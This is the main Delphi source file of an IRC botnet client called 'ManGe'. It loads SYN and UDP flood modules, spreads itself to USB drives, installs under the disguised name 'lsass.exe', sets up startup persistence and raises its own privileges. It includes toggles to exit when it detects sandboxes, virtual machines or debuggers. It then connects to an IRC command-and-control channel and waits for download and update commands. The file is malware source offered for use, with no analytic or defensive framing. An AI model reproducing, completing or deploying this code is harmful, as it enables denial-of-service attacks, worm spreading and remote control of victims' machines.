program Stub;


uses
  Windows,
  base in 'Units\base.pas',
  commands in 'Units\commands.pas',
  functions in 'Units\functions.pas',
  dlupdate in 'Units\dlupdate.pas',
  antis in 'Units\antis.pas',
  EditSvr in 'Units\EditSvr.pas',
  synflood in 'Units\synflood.pas',
  udpflood in 'Units\udpflood.pas',
  variables in 'Units\variables.pas',
  miscfunctions in 'Units\miscfunctions.pas',
  seeder in 'Units\seeder.pas';

procedure TimerGo3(Wnd:HWnd;Msg,TimerID,dwTime:DWORD);stdcall;
begin
  InfectUsbDrives(bot_installname);
end;

begin

  (* config *)
  bot_mutexname     := 'ManGe Mutex';
  bot_installname   := 'lsass.exe';
  bot_prefix        := '@';
  server_address    := '127.0.0.1';
  server_port       := 6667;
  server_nick       := '{%cc%|%os%|%rn%}';
  server_channel    := '#ManGe';
  server_channelkey := 'ManGePass';
  dlcmd             := 'Download';
  upcmd             := 'Update';
  auth              := '*!*@*';
  MircNick          := 'uknowme';

  (* 1 = Enabled, 0 = Disabled *)
  C_Sandboxie       := '0';
  C_sysdebug        := '0';
  C_joebox          := '0';
  C_threat          := '0';
  C_olly            := '0';
  C_vmware          := '0';
  C_norman          := '0';
  c_virtual         := '0';
  C_vpc             := '0';
  C_debugs          := '0';
  c_soft            := '0';
  C_cwsand          := '0';
  usb               := '0';

  if C_Sandboxie = '1' then if Sandboxie = true then ExitProcess(0);
  if C_vpc = '1' then if IsInVPC = true then ExitProcess(0);
  if C_vmware = '1' then if InVMware = true then ExitProcess(0);
  if C_virtual = '1' then if InVirtualBox = true then ExitProcess(0);
  if C_threat = '1' then if ThreadExpert = true then ExitProcess(0);
  if C_cwsand = '1' then if CWSandbox = true then ExitProcess(0);
  if C_joebox = '1' then if JoeBox = true then ExitProcess(0);
  if C_norman = '1' then if NormanSandBox = true then ExitProcess(0);
  if C_soft = '1' then if IsSoftIce = true then ExitProcess(0);
  if C_debugs = '1' then if IsInDebugger = true then ExitProcess(0);
  if C_olly = '1' then if IsODBGLoaded = true then ExitProcess(0);
  if C_sysdebug = '1' then if SyserDebugger = true then ExitProcess(0);

  LoadData; //<< this should of been above the antis ;)
  Startup(bot_installname);
  SetTokenPrivileges;
  CreateMutex(nil, false, pchar(bot_mutexname));
  if GetLastError = ERROR_ALREADY_EXISTS then begin
    exitprocess(0);
  end;

  if usb = '1' then
  begin
  StartThread(@TimerGo3);
  end;


  mainIRC := TIRCSocket.Create;
  Repeat
    mainIRC.Initialize;
    Sleep(60000);
  Until 1=2;

end.
